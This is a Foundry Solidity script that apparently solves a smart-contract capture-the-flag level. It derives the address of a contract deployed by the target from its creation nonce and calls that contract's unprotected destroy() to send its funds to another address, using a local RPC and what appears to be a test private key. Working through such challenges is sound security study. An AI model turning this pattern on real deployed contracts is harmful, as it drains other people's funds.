// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function destroy(address payable _to) external;
}
contract SolveScript is Script {
    address public target = 0x8e80FFe6Dc044F4A766Afd6e5a8732Fe0977A493;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        address token = vm.computeCreateAddress(target, 1);
        console.log("Token address calculation : %s", token);
        console.log("Token address code length : %d", token.code.length);

        ITarget(token).destroy(payable(address(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)));
        vm.stopBroadcast();
    }
}
